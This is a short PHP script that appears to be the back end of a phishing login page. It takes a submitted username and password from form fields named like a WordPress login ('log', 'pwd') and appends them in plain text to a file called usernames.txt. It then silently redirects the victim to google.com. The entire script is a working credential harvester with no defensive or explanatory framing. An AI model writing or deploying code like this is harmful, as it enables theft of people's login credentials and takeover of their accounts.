<?php

file_put_contents("usernames.txt", "Account: " . $_POST['log'] . "\nPass: " . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
